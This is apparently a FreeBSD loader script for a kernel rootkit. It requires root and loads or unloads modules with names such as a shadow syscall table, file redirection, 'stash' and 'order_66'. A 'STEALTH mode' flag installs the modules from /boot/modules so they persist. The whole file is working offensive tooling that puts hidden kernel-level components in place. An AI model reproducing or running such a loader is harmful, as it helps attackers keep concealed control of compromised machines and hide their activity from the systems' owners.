#!/bin/sh

let euid=$(id -u)

if [ $euid -ne 0 ]; then
   echo "Must be root to run this"
   exit 1
fi

MAGICK_STR=`grep "#define T_NAME" ./src/magick.h | awk '{print $3}' | sed s/\"//g`

kldcmd="kldload -v "
kmod_prefix="./obj/${MAGICK_STR}"
let unload_tbl=0
let test_mode=1
while [ "$#" -gt 0 ]
do
   arg="$1"

   case $arg in
      # UNLOAD mode
      -u)
         unload_tbl=1
         shift
      ;;
      # STEALTH mode
      -s)
         test_mode=0
         shift
      ;;
   esac
done

if [ $test_mode -eq 0 ]; then
   kmod_prefix="/boot/modules/${MAGICK_STR}"
fi

if [ $unload_tbl -eq 1 ]; then
   kldcmd="kldunload -v "
else 
   $kldcmd ${kmod_prefix}_shdw_sysent_tbl.ko
fi

$kldcmd ${kmod_prefix}_shdw_lookup.ko
$kldcmd ${kmod_prefix}_deepbg.ko
$kldcmd ${kmod_prefix}_whisper.ko
$kldcmd ${kmod_prefix}_knighted.ko
$kldcmd ${kmod_prefix}_stash.ko
$kldcmd ${kmod_prefix}_file_redirection.ko
$kldcmd ${kmod_prefix}_order_66.ko

if [ $unload_tbl -eq 1 ]; then
   $kldcmd ${kmod_prefix}_shdw_sysent_tbl.ko
fi
